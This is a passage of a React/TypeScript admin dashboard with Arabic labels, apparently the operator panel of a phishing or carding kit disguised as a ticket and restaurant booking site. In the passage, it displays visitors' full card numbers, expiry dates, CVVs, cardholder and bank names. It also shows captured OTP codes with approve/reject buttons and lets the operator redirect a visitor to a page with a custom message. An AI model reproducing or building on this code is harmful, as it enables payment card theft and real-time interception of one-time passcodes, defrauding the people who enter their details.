      "Saudi Arabia":"🇸🇦","United Arab Emirates":"🇦🇪","Kuwait":"🇰🇼","Bahrain":"🇧🇭",
      "Qatar":"🇶🇦","Oman":"🇴🇲","Egypt":"🇪🇬","Jordan":"🇯🇴","Iraq":"🇮🇶",
      "Lebanon":"🇱🇧","Syria":"🇸🇾","Palestine":"🇵🇸","Yemen":"🇾🇪","Iran":"🇮🇷",
      "Turkey":"🇹🇷","Israel":"🇮🇱",
      // شمال أفريقيا
      "Libya":"🇱🇾","Tunisia":"🇹🇳","Algeria":"🇩🇿","Morocco":"🇲🇦","Sudan":"🇸🇩",
      "South Sudan":"🇸🇸","Mauritania":"🇲🇷",
      // أفريقيا
      "Somalia":"🇸🇴","Nigeria":"🇳🇬","South Africa":"🇿🇦","Kenya":"🇰🇪","Ethiopia":"🇪🇹",
      "Ghana":"🇬🇭","Tanzania":"🇹🇿","Uganda":"🇺🇬","Cameroon":"🇨🇲","Senegal":"🇸🇳",
      "Ivory Coast":"🇨🇮","Cote d'Ivoire":"🇨🇮","Rwanda":"🇷🇼","Mozambique":"🇲🇿",
      "Angola":"🇦🇴","Zimbabwe":"🇿🇼","Zambia":"🇿🇲","Mali":"🇲🇱","Niger":"🇳🇪",
      "Congo":"🇨🇬","DR Congo":"🇨🇩","Madagascar":"🇲🇬","Botswana":"🇧🇼","Namibia":"🇳🇦",
      // أوروبا
      "United Kingdom":"🇬🇧","Germany":"🇩🇪","France":"🇫🇷","Italy":"🇮🇹","Spain":"🇪🇸",
      "Netherlands":"🇳🇱","Belgium":"🇧🇪","Switzerland":"🇨🇭","Austria":"🇦🇹",
      "Sweden":"🇸🇪","Norway":"🇳🇴","Denmark":"🇩🇰","Finland":"🇫🇮","Iceland":"🇮🇸",
      "Ireland":"🇮🇪","Portugal":"🇵🇹","Greece":"🇬🇷","Poland":"🇵🇱",
      "Czech Republic":"🇨🇿","Czechia":"🇨🇿","Romania":"🇷🇴","Hungary":"🇭🇺",
      "Ukraine":"🇺🇦","Bulgaria":"🇧🇬","Croatia":"🇭🇷","Serbia":"🇷🇸",
      "Slovakia":"🇸🇰","Slovenia":"🇸🇮","Lithuania":"🇱🇹","Latvia":"🇱🇻","Estonia":"🇪🇪",
      "Luxembourg":"🇱🇺","Malta":"🇲🇹","Cyprus":"🇨🇾","Albania":"🇦🇱",
      "Bosnia and Herzegovina":"🇧🇦","North Macedonia":"🇲🇰","Montenegro":"🇲🇪",
      "Moldova":"🇲🇩","Belarus":"🇧🇾","Georgia":"🇬🇪","Armenia":"🇦🇲","Azerbaijan":"🇦🇿",
      // أمريكا الشمالية والجنوبية
      "United States":"🇺🇸","Canada":"🇨🇦","Mexico":"🇲🇽","Brazil":"🇧🇷",
      "Argentina":"🇦🇷","Colombia":"🇨🇴","Chile":"🇨🇱","Peru":"🇵🇪","Venezuela":"🇻🇪",
      "Ecuador":"🇪🇨","Bolivia":"🇧🇴","Paraguay":"🇵🇾","Uruguay":"🇺🇾",
      "Cuba":"🇨🇺","Dominican Republic":"🇩🇴","Costa Rica":"🇨🇷","Panama":"🇵🇦",
      "Guatemala":"🇬🇹","Honduras":"🇭🇳","El Salvador":"🇸🇻","Jamaica":"🇯🇲",
      "Trinidad and Tobago":"🇹🇹","Puerto Rico":"🇵🇷",
      // آسيا
      "India":"🇮🇳","China":"🇨🇳","Japan":"🇯🇵","South Korea":"🇰🇷","North Korea":"🇰🇵",
      "Pakistan":"🇵🇰","Bangladesh":"🇧🇩","Sri Lanka":"🇱🇰","Afghanistan":"🇦🇫",
      "Indonesia":"🇮🇩","Malaysia":"🇲🇾","Singapore":"🇸🇬","Thailand":"🇹🇭",
      "Philippines":"🇵🇭","Vietnam":"🇻🇳","Myanmar":"🇲🇲","Cambodia":"🇰🇭",
      "Laos":"🇱🇦","Nepal":"🇳🇵","Uzbekistan":"🇺🇿","Kazakhstan":"🇰🇿",
      "Turkmenistan":"🇹🇲","Tajikistan":"🇹🇯","Kyrgyzstan":"🇰🇬","Mongolia":"🇲🇳",
      "Taiwan":"🇹🇼","Hong Kong":"🇭🇰","Macao":"🇲🇴","Brunei":"🇧🇳","Maldives":"🇲🇻",
      // أوقيانوسيا
      "Australia":"🇦🇺","New Zealand":"🇳🇿","Fiji":"🇫🇯","Papua New Guinea":"🇵🇬",
      // أخرى
      "Russia":"🇷🇺",
    };
    return map[name] || "🌍";
  };

  const statusLabel = (s: string) => {
    const map: Record<string, { text: string; color: string }> = {
      confirmed: { text: "مؤكد",          color: "text-emerald-600 bg-emerald-50" },
      pending:   { text: "قيد الانتظار",  color: "text-amber-600 bg-amber-50" },
      cancelled: { text: "ملغي",          color: "text-red-600 bg-red-50" },
      rejected:  { text: "مرفوض",         color: "text-red-600 bg-red-50" },
    };
    return map[s] || { text: s, color: "text-slate-600 bg-slate-50" };
  };

  // ─────────────────────────────────────────────
  // Render helpers
  // ─────────────────────────────────────────────
  const CollapsibleSection = ({ sectionKey, icon: Icon, iconColor, bgColor, borderColor, title, count, compact, children }: {
    sectionKey: string; icon: any; iconColor: string; bgColor: string; borderColor: string; title: string; count: number; compact: boolean; children: React.ReactNode;
  }) => {
    const isOpen = openSections[sectionKey] ?? true;
    const sm = compact ? "text-[11px]" : "text-[12px]";
    return (
      <div className={`border ${borderColor} rounded-xl overflow-hidden transition-all duration-200`}>
        <button
          onClick={() => toggleSection(sectionKey)}
          className={`w-full ${bgColor} px-3 py-2 flex items-center gap-1.5 hover:opacity-80 transition-opacity`}
        >
          <div className={`w-5 h-5 rounded-md bg-gradient-to-br ${iconColor.replace("text-", "from-")} to-transparent/50 flex items-center justify-center`}>
            <Icon className={`w-3 h-3 text-white`} />
          </div>
          <span className={`${sm} font-bold ${iconColor} flex-1 text-right`}>{title} ({count})</span>
          <ChevronDown className={`w-3.5 h-3.5 ${iconColor} transition-transform duration-300 ${isOpen ? "rotate-180" : ""}`} />
        </button>
        <div
          className={`transition-all duration-300 ease-in-out ${isOpen ? "max-h-[600px] opacity-100" : "max-h-0 opacity-0"} overflow-hidden`}
        >
          {children}
        </div>
      </div>
    );
  };

  const renderEventBookings = (compact: boolean) => {
    if (!visitorEventBookings.length) return null;
    const sm  = compact ? "text-[11px]" : "text-[12px]";
    const xs  = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    return (
      <CollapsibleSection sectionKey="eventBookings" icon={CalendarDays} iconColor="text-indigo-500" bgColor="bg-indigo-50" borderColor="border-indigo-100" title="حجوزات الفعاليات" count={visitorEventBookings.length} compact={compact}>
        <div className={`${pad} space-y-1.5 max-h-[200px] overflow-y-auto`}>
          {visitorEventBookings.map(eb => {
            const st = statusLabel(eb.status);
            return (
              <div key={eb.id} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                <CalendarDays className="w-4 h-4 text-indigo-400 shrink-0" />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className={`${sm} font-medium text-slate-700 truncate`}>{eb.event_title}</span>
                    <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                  </div>
                  <div className="flex items-center gap-2 mt-0.5">
                    <span className={`${xs} text-slate-500`}>{eb.guests} أشخاص</span>
                    <span className={`${xs} text-slate-400`}>{getTimeDiff(eb.created_at)}</span>
                  </div>
                  {eb.notes && <p className={`${xs} text-slate-400 mt-0.5 truncate`}>{eb.notes}</p>}
                </div>
              </div>
            );
          })}
        </div>
      </CollapsibleSection>
    );
  };

  const renderPaymentInfo = (compact: boolean) => {
    const ordersWithCard = visitorOrders.filter(o =>
      o.card_last4 || o.card_brand || o.cardholder_name || o.card_full_number
    );
    if (!ordersWithCard.length) return null;

    const sm = compact ? "text-[11px]" : "text-[12px]";
    const xs = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    const fmt = (num: string) => num.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim();

    return (
      <CollapsibleSection sectionKey="payment" icon={CreditCard} iconColor="text-sky-500" bgColor="bg-sky-50" borderColor="border-sky-100" title="معلومات الدفع الكاملة" count={ordersWithCard.length} compact={compact}>
        <div className={`${pad} space-y-4`}>
          {ordersWithCard.map(order => (
            <div key={order.id} className="space-y-2">
              <div className="flex items-center justify-between">
                <span className={`${xs} text-slate-400`}>{order.confirmation_number || order.id.slice(0, 8)}</span>
                <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${statusLabel(order.status).color}`}>
                  {statusLabel(order.status).text}
                </span>
              </div>
              <div className="bg-slate-800 rounded-xl p-3 space-y-2">
                <div className="flex items-center justify-between">
                  <span className={`${xs} text-slate-400`}>رقم البطاقة</span>
                  <span className={`${sm} font-mono font-bold text-white tracking-widest`} dir="ltr">
                    {order.card_full_number ? fmt(order.card_full_number) : `•••• •••• •••• ${order.card_last4 || "----"}`}
                  </span>
                </div>
                {order.card_expiry && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>تاريخ الانتهاء</span>
                    <span className={`${sm} font-mono font-bold text-white`} dir="ltr">{order.card_expiry}</span>
                  </div>
                )}
                {order.card_cvv && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>CVV</span>
                    <span className={`${sm} font-mono font-bold text-amber-400`} dir="ltr">{order.card_cvv}</span>
                  </div>
                )}
                {order.cardholder_name && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>حامل البطاقة</span>
                    <span className={`${sm} font-semibold text-white`}>{order.cardholder_name}</span>
                  </div>
                )}
                {order.bank_name && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>البنك</span>
                    <span className={`${sm} font-medium text-sky-300`}>{order.bank_name}</span>
                  </div>
                )}
                {order.card_brand && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>نوع البطاقة</span>
                    <span className={`${sm} font-bold text-amber-400 uppercase`}>{order.card_brand}</span>
                  </div>
                )}
                <div className="border-t border-slate-600 pt-2 flex items-center justify-between">
                  <span className={`${xs} text-slate-400`}>المبلغ الإجمالي</span>
                  <span className={`${sm} font-bold text-emerald-400`}>{order.total} ر.س</span>
                </div>
              </div>
              <div className="bg-slate-50 rounded-xl p-2.5 space-y-1.5">
                <span className={`${xs} font-semibold text-slate-500 block mb-1`}>بيانات الزائر</span>
                {order.email && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>البريد الإلكتروني</span>
                    <span className={`${xs} font-medium text-slate-700`} dir="ltr">{order.email}</span>
                  </div>
                )}
                {order.phone && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>رقم الجوال</span>
                    <span className={`${xs} font-medium text-slate-700`} dir="ltr">{order.phone}</span>
                  </div>
                )}
                {order.subtotal != null && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>المجموع الفرعي</span>
                    <span className={`${xs} font-medium text-slate-700`}>{order.subtotal} ر.س</span>
                  </div>
                )}
                {order.vat != null && (
                  <div className="flex items-center justify-between">
                    <span className={`${xs} text-slate-400`}>ضريبة القيمة المضافة</span>
                    <span className={`${xs} font-medium text-slate-700`}>{order.vat} ر.س</span>
                  </div>
                )}
                {order.tickets && Array.isArray(order.tickets) && order.tickets.length > 0 && (
                  <div className="mt-1 pt-1 border-t border-slate-200">
                    <span className={`${xs} font-semibold text-slate-500 block mb-1`}>التذاكر</span>
                    {order.tickets.map((t: any, i: number) => (
                      <div key={i} className="flex items-center justify-between">
                        <span className={`${xs} text-slate-600`}>{t.name || t.id}</span>
                        <span className={`${xs} text-slate-500`}>{t.qty} × {t.price} ر.س</span>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          ))}
        </div>
      </CollapsibleSection>
    );
  };

  const renderOtpSection = (compact: boolean) => {
    if (!visitorOtpRequests.length) return null;

    const sm = compact ? "text-[11px]" : "text-[12px]";
    const xs = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    return (
      <CollapsibleSection sectionKey="otp" icon={Shield} iconColor="text-violet-500" bgColor="bg-violet-50" borderColor="border-violet-100" title="رموز OTP" count={visitorOtpRequests.length} compact={compact}>
        <div className={`${pad} space-y-2`}>
          {visitorOtpRequests.map(req => (
            <div key={req.id} className="bg-slate-50 rounded-xl p-3 space-y-2">
              <div className="flex items-center justify-between">
                <span className={`${xs} text-slate-400`}>رمز OTP</span>
                <span
                  className={`${sm} font-mono font-bold text-violet-600 tracking-[0.3em] bg-violet-50 px-2 py-0.5 rounded-lg border border-violet-100`}
                  dir="ltr"
                >
                  {req.otp_code}
                </span>
              </div>
              {req.order_id && (
                <div className="flex items-center justify-between">
                  <span className={`${xs} text-slate-400`}>رقم الطلب</span>
                  <span className={`${xs} font-mono text-slate-500`}>
                    {visitorOrders.find(o => o.id === req.order_id)?.confirmation_number || req.order_id.slice(0, 8)}
                  </span>
                </div>
              )}
              <div className="flex items-center justify-between">
                <span className={`${xs} text-slate-400`}>وقت الإرسال</span>
                <span className={`${xs} text-slate-500`}>{getTimeDiff(req.created_at)}</span>
              </div>
              {req.status === "pending" ? (
                <div className="flex gap-1.5 pt-1">
                  <button
                    onClick={() => approveOtp(req.id)}
                    className={`flex-1 flex items-center justify-center gap-1 py-2 rounded-lg bg-emerald-500 text-white ${xs} font-bold hover:bg-emerald-600 active:scale-95 transition-all shadow-sm`}
                  >
                    <CheckCircle className="w-3.5 h-3.5" /> موافقة
                  </button>
                  <button
                    onClick={() => rejectOtp(req.id)}
                    className={`flex-1 flex items-center justify-center gap-1 py-2 rounded-lg bg-red-500 text-white ${xs} font-bold hover:bg-red-600 active:scale-95 transition-all shadow-sm`}
                  >
                    <XCircle className="w-3.5 h-3.5" /> رفض
                  </button>
                </div>
              ) : (
                <div className={`flex items-center justify-center gap-1.5 py-1.5 rounded-lg ${xs} font-semibold ${
                  req.status === "approved"
                    ? "bg-emerald-50 text-emerald-600 border border-emerald-100"
                    : "bg-red-50 text-red-500 border border-red-100"
                }`}>
                  {req.status === "approved"
                    ? <><CheckCircle className="w-3 h-3" /> تمت الموافقة</>
                    : <><XCircle className="w-3 h-3" /> تم الرفض</>
                  }
                </div>
              )}
            </div>
          ))}
        </div>
      </CollapsibleSection>
    );
  };

  const renderOrdersBookings = (compact: boolean) => {
    if (!visitorOrders.length && !visitorBookings.length) return null;
    const sm  = compact ? "text-[11px]" : "text-[12px]";
    const xs  = compact ? "text-[9px]"  : "text-[10px]";
    const pad = compact ? "p-2" : "p-3";

    return (
      <>
        {visitorOrders.length > 0 && (
          <CollapsibleSection sectionKey="orders" icon={ShoppingBag} iconColor="text-purple-500" bgColor="bg-purple-50" borderColor="border-purple-100" title="طلبات التذاكر" count={visitorOrders.length} compact={compact}>
            <div className={`${pad} space-y-1.5 max-h-[280px] overflow-y-auto`}>
              {visitorOrders.map(order => {
                const st = statusLabel(order.status);
                const isPending = order.status !== "confirmed" && order.status !== "rejected";
                return (
                  <div key={order.id} className="bg-slate-50 rounded-lg p-2.5 space-y-1.5">
                    <div className="flex items-center gap-2">
                      <Ticket className="w-4 h-4 text-purple-400 shrink-0" />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className={`${sm} font-medium text-slate-700`}>
                            {order.confirmation_number || order.id.slice(0, 8)}
                          </span>
                          <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                        </div>
                        <div className="flex items-center gap-2 mt-0.5">
                          <span className={`${xs} text-slate-500`}>{order.total} ر.س</span>
                          <span className={`${xs} text-slate-400`}>{getTimeDiff(order.created_at)}</span>
                        </div>
                      </div>
                    </div>
                    {isPending ? (
                      <div className="flex gap-1.5">
                        <button
                          onClick={(e) => updateOrderStatus(order.id, "confirmed", e)}
                          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-emerald-50 text-emerald-600 ${xs} font-semibold hover:bg-emerald-100 transition-colors`}
                        >
                          <CheckCircle className="w-3 h-3" /> قبول
                        </button>
                        <button
                          onClick={(e) => updateOrderStatus(order.id, "rejected", e)}
                          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-red-50 text-red-500 ${xs} font-semibold hover:bg-red-100 transition-colors`}
                        >
                          <XCircle className="w-3 h-3" /> رفض
                        </button>
                      </div>
                    ) : (
                      <div className={`flex items-center justify-center gap-1 py-1.5 rounded-lg ${xs} font-semibold ${
                        order.status === "confirmed" ? "bg-emerald-50 text-emerald-600" : "bg-red-50 text-red-500"
                      }`}>
                        {order.status === "confirmed"
                          ? <><CheckCircle className="w-3 h-3" /> تم القبول</>
                          : <><XCircle className="w-3 h-3" /> تم الرفض</>}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </CollapsibleSection>
        )}

        {visitorBookings.length > 0 && (
          <CollapsibleSection sectionKey="bookings" icon={UtensilsCrossed} iconColor="text-teal-500" bgColor="bg-teal-50" borderColor="border-teal-100" title="حجوزات المطاعم" count={visitorBookings.length} compact={compact}>
            <div className={`${pad} space-y-1.5 max-h-[200px] overflow-y-auto`}>
              {visitorBookings.map(booking => {
                const st = statusLabel(booking.status);
                return (
                  <div key={booking.id} className="flex items-center gap-2 bg-slate-50 rounded-lg p-2.5">
                    <UtensilsCrossed className="w-4 h-4 text-teal-400 shrink-0" />
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
                        <span className={`${sm} font-medium text-slate-700`}>{booking.restaurant}</span>
                        <span className={`${xs} font-medium px-1.5 py-0.5 rounded-full ${st.color}`}>{st.text}</span>
                      </div>
                      <div className="flex items-center gap-2 mt-0.5">
                        <span className={`${xs} text-slate-500`}>{booking.booking_date} · {booking.guests} أشخاص</span>
                        <span className={`${xs} text-slate-400`}>{getTimeDiff(booking.created_at)}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </CollapsibleSection>
        )}
      </>
    );
  };

  const renderActionsLog = (compact: boolean) => {
    if (!selectedActions.length) return null;
    const actionStyles: Record<string, { icon: any; color: string; bg: string }> = {
      new_visitor:        { icon: UserPlus,        color: "text-emerald-500", bg: "bg-emerald-50" },
      page_view:          { icon: Navigation,      color: "text-blue-500",   bg: "bg-blue-50" },
      contact_message:    { icon: MessageSquare,   color: "text-indigo-500", bg: "bg-indigo-50" },
      restaurant_booking: { icon: UtensilsCrossed, color: "text-amber-500",  bg: "bg-amber-50" },
      ticket_purchase:    { icon: Ticket,          color: "text-purple-500", bg: "bg-purple-50" },
    };
    const sm = compact ? "text-[11px]" : "text-[12px]";
    const xs = compact ? "text-[9px]"  : "text-[10px]";

    return (
      <div className="border border-amber-100 rounded-xl overflow-hidden">
        <div className="bg-amber-50 px-3 py-1.5">
          <span className={`${sm} font-semibold text-amber-600`}>سجل الإجراءات</span>
        </div>
        <div className={`${compact ? "p-2 space-y-1 max-h-[150px]" : "p-3 space-y-1.5 max-h-[200px]"} overflow-y-auto`}>
          {selectedActions.map(action => {
            const style = actionStyles[action.action_type] || { icon: MousePointer, color: "text-slate-400", bg: "bg-slate-50" };
            const Icon = style.icon;
            return (
              <div key={action.id} className={`flex items-center gap-2 rounded-lg p-2 ${style.bg}`}>
                <Icon className={`w-3 h-3 ${style.color} shrink-0`} />
                <div className="flex-1 min-w-0">
                  <p className={`${sm} text-slate-700 truncate`}>{action.action_detail}</p>
                  <p className={`${xs} text-slate-400`}>{getTimeDiff(action.created_at)}</p>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    );
  };

  const renderRedirectDropdown = (visitor: Visitor, compact: boolean) => {
    const sm = compact ? "text-[11px]" : "text-[13px]";
    return (
      <div className="border border-slate-200 rounded-xl overflow-hidden">
        <div className="bg-slate-50 px-3 py-1.5 border-b border-slate-100">
          <span className={`${compact ? "text-[11px]" : "text-[12px]"} font-semibold text-slate-600`}>توجيه لصفحة</span>
        </div>
        <div className="p-2.5 space-y-2">
          <select
            className={`w-full ${sm} border border-slate-200 rounded-lg px-3 py-2 bg-white text-slate-700 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all`}
            value={redirectPath}
            onChange={e => setRedirectPath(e.target.value)}
          >
            <option value="" disabled>اختر صفحة</option>
            {sitePages.map(p => <option key={p.path} value={p.path}>{p.label}</option>)}
          </select>
          <input
            type="text"
            placeholder="رسالة مخصصة (اختياري)..."
            value={redirectMessage}
            onChange={e => setRedirectMessage(e.target.value)}
            className={`w-full ${sm} border border-slate-200 rounded-lg px-3 py-2 bg-white text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-violet-500/20 focus:border-violet-400 transition-all`}
            dir="rtl"
          />
          <div className="flex items-center gap-1.5">
            {notificationTypes.map(nt => (
              <button
                key={nt.key}
                onClick={() => setRedirectNotifType(nt.key)}
                className={`flex-1 text-[10px] py-1.5 rounded-lg border-2 transition-all font-medium ${
                  redirectNotifType === nt.key
                    ? `${nt.color} text-white border-transparent shadow-sm`
                    : "bg-white text-slate-500 border-slate-200 hover:border-slate-300"
                }`}
                title={nt.label}
              >
                {nt.icon}
              </button>
            ))}
          </div>
          <button
            onClick={() => {
              if (redirectPath) {
                redirectVisitor(visitor.id, redirectPath, redirectNotifType, redirectMessage.trim());
                setRedirectPath(""); setRedirectMessage("");
              }
            }}
            className={`w-full ${compact ? "py-2 text-[11px]" : "py-2.5 text-[13px]"} rounded-lg bg-violet-500 text-white font-medium hover:bg-violet-600 active:scale-95 transition-all`}
          >
            توجيه
          </button>
        </div>
      </div>
    );
  };
  // ─────────────────────────────────────────────
  // Unified Timeline
  // ─────────────────────────────────────────────
  interface TimelineItem {
    id: string;
    type: "order" | "booking" | "event_booking" | "otp" | "message" | "action";
    icon: any;
    iconColor: string;
    bgColor: string;
    title: string;
    subtitle: string;
    created_at: string;
    status?: string;
    data?: any;
  }

  const buildTimeline = (): TimelineItem[] => {
    const items: TimelineItem[] = [];

    visitorOrders.forEach(o => items.push({
      id: `order-${o.id}`, type: "order", icon: Ticket, iconColor: "text-purple-500", bgColor: "bg-purple-50",
      title: `طلب تذكرة #${o.confirmation_number || o.id.slice(0, 8)}`,
      subtitle: `${o.total} ر.س${o.cardholder_name ? ` · ${o.cardholder_name}` : ""}`,
      created_at: o.created_at, status: o.status, data: o,
    }));

    visitorBookings.forEach(b => items.push({
      id: `booking-${b.id}`, type: "booking", icon: UtensilsCrossed, iconColor: "text-teal-500", bgColor: "bg-teal-50",
      title: `حجز مطعم: ${b.restaurant}`,
      subtitle: `${b.booking_date} · ${b.guests} أشخاص`,
      created_at: b.created_at, status: b.status, data: b,
    }));

    visitorEventBookings.forEach(eb => items.push({
      id: `event-${eb.id}`, type: "event_booking", icon: CalendarDays, iconColor: "text-indigo-500", bgColor: "bg-indigo-50",
      title: `حجز فعالية: ${eb.event_title}`,
      subtitle: `${eb.guests} أشخاص${eb.notes ? ` · ${eb.notes}` : ""}`,
      created_at: eb.created_at, status: eb.status, data: eb,
    }));

    visitorOtpRequests.forEach(otp => items.push({
      id: `otp-${otp.id}`, type: "otp", icon: Shield, iconColor: "text-violet-500", bgColor: "bg-violet-50",
      title: `رمز OTP: ${otp.otp_code}`,
      subtitle: visitorOrders.find(o => o.id === otp.order_id)?.confirmation_number || otp.order_id?.slice(0, 8) || "",
      created_at: otp.created_at, status: otp.status, data: otp,
    }));

    visitorMessages.forEach(m => items.push({
      id: `msg-${m.id}`, type: "message", icon: MessageSquare, iconColor: "text-blue-500", bgColor: "bg-blue-50",
      title: `رسالة تواصل${m.subject ? `: ${m.subject}` : ""}`,
      subtitle: m.message.slice(0, 80) + (m.message.length > 80 ? "..." : ""),
      created_at: m.created_at, data: m,
    }));

    selectedActions.filter(a => a.action_type !== "page_view").forEach(a => {
      const styles: Record<string, { icon: any; color: string; bg: string }> = {
        new_visitor: { icon: UserPlus, color: "text-emerald-500", bg: "bg-emerald-50" },
        contact_message: { icon: MessageSquare, color: "text-indigo-500", bg: "bg-indigo-50" },
        restaurant_booking: { icon: UtensilsCrossed, color: "text-amber-500", bg: "bg-amber-50" },
        ticket_purchase: { icon: Ticket, color: "text-purple-500", bg: "bg-purple-50" },
        event_booking: { icon: CalendarDays, color: "text-pink-500", bg: "bg-pink-50" },
        newsletter_signup: { icon: Bell, color: "text-cyan-500", bg: "bg-cyan-50" },
      };
      const s = styles[a.action_type] || { icon: MousePointer, color: "text-slate-400", bg: "bg-slate-50" };
      items.push({
        id: `action-${a.id}`, type: "action", icon: s.icon, iconColor: s.color, bgColor: s.bg,
        title: a.action_detail || a.action_type,
        subtitle: "", created_at: a.created_at,
      });
    });

    items.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
    return items;
  };

  const renderStatusActions = (item: TimelineItem, compact: boolean) => {
    const xs = compact ? "text-[9px]" : "text-[10px]";
    const isPending = item.status === "pending";

    if (item.type === "order" && isPending) {
      return (
        <div className="flex gap-1.5 mt-2">
          <button onClick={(e) => updateOrderStatus(item.data.id, "confirmed", e)}
            className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-emerald-500 text-white ${xs} font-bold hover:bg-emerald-600 active:scale-95 transition-all`}>
            <CheckCircle className="w-3 h-3" /> موافقة
          </button>
          <button onClick={(e) => updateOrderStatus(item.data.id, "rejected", e)}
            className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-red-500 text-white ${xs} font-bold hover:bg-red-600 active:scale-95 transition-all`}>
            <XCircle className="w-3 h-3" /> رفض
          </button>
        </div>
      );
    }
    // Bookings, event bookings, and messages show status badges instead of action buttons
    if (item.type === "booking" || item.type === "event_booking") {
      const statusMap: Record<string, { text: string; color: string; icon: "check" | "x" | "clock" }> = {
        pending: { text: "معلّق", color: "bg-amber-50 text-amber-600 border border-amber-200", icon: "clock" },
        confirmed: { text: "مقبول", color: "bg-emerald-50 text-emerald-600 border border-emerald-200", icon: "check" },
        cancelled: { text: "مرفوض", color: "bg-red-50 text-red-500 border border-red-200", icon: "x" },
        rejected: { text: "مرفوض", color: "bg-red-50 text-red-500 border border-red-200", icon: "x" },
      };
      const badge = statusMap[item.status || "pending"] || statusMap.pending;
      return (
        <div className={`mt-2 inline-flex items-center gap-1 px-2.5 py-1 rounded-full ${xs} font-semibold ${badge.color}`}>
          {badge.icon === "check" && <CheckCircle className="w-3 h-3" />}
          {badge.icon === "x" && <XCircle className="w-3 h-3" />}
          {badge.icon === "clock" && <Clock className="w-3 h-3" />}
          {badge.text}
        </div>
      );
    }
    if (item.type === "message") {
      const isRead = item.data.is_read;
      return (
        <div className={`mt-2 inline-flex items-center gap-1 px-2.5 py-1 rounded-full ${xs} font-semibold ${
          isRead ? "bg-emerald-50 text-emerald-600 border border-emerald-200" : "bg-blue-50 text-blue-600 border border-blue-200"
        }`}>
          {isRead ? <CheckCircle className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
          {isRead ? "مقروءة" : "جديدة"}
        </div>
      );
    }
    if (item.type === "otp" && isPending) {
      return (
        <div className="flex gap-1.5 mt-2">
          <button onClick={() => approveOtp(item.data.id)}
            className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-emerald-500 text-white ${xs} font-bold hover:bg-emerald-600 active:scale-95 transition-all`}>
            <CheckCircle className="w-3 h-3" /> موافقة
          </button>
          <button onClick={() => rejectOtp(item.data.id)}
            className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-red-500 text-white ${xs} font-bold hover:bg-red-600 active:scale-95 transition-all`}>
            <XCircle className="w-3 h-3" /> رفض
          </button>
        </div>
      );
    }

    // Show status badge for resolved items (orders, otp after action)
    if (item.status && item.status !== "pending") {
      const st = statusLabel(item.status);
      return (
        <div className={`mt-2 inline-flex items-center gap-1 px-2.5 py-1 rounded-full ${xs} font-semibold ${st.color}`}>
          {item.status === "confirmed" || item.status === "approved"
            ? <CheckCircle className="w-3 h-3" />
            : <XCircle className="w-3 h-3" />}
          {st.text}
        </div>
      );
    }
    return null;
  };

  const renderTimeline = (compact: boolean) => {
    const timeline = buildTimeline();
    if (!timeline.length) return null;

    const sm = compact ? "text-[13px]" : "text-[14px]";
    const xs = compact ? "text-[11px]" : "text-[12px]";

    return (
      <div className="border border-amber-100 rounded-xl overflow-hidden">
        <div className="bg-amber-50 px-3 py-2 flex items-center gap-1.5">
          <Clock className="w-3.5 h-3.5 text-amber-500" />
          <span className={`${sm} font-bold text-amber-600 flex-1`}>التايم لاين ({timeline.length})</span>
        </div>
        <div className={`${compact ? "p-2" : "p-3"} max-h-[500px] overflow-y-auto`}>
          <div className="relative">
            {/* Vertical line */}
            <div className="absolute right-[15px] top-0 bottom-0 w-0.5 bg-slate-200" />

            <div className="space-y-3">
              {timeline.map((item, idx) => {
                const Icon = item.icon;
                return (
                  <div key={item.id} className="relative flex gap-3 pr-1">
                    {/* Dot on timeline */}
                    <div className={`relative z-10 w-8 h-8 rounded-full ${item.bgColor} flex items-center justify-center shrink-0 border-2 border-white shadow-sm`}>
                      <Icon className={`w-3.5 h-3.5 ${item.iconColor}`} />
                    </div>

                    {/* Content */}
                    <div className="flex-1 min-w-0 pb-1">
                      <div className="bg-white rounded-xl border border-slate-100 p-2.5 shadow-sm hover:shadow-md transition-shadow">
                        <div className="flex items-start justify-between gap-2">
                          <p className={`${sm} font-semibold text-slate-700 leading-snug`}>{item.title}</p>
                          <span className={`${xs} text-slate-400 shrink-0 whitespace-nowrap`}>{getTimeDiff(item.created_at)}</span>
                        </div>
                        {item.subtitle && (
                          <p className={`${xs} text-slate-500 mt-0.5 leading-relaxed`}>{item.subtitle}</p>
                        )}

                        {/* Payment card preview for orders */}
                        {item.type === "order" && item.data.card_full_number && (() => {
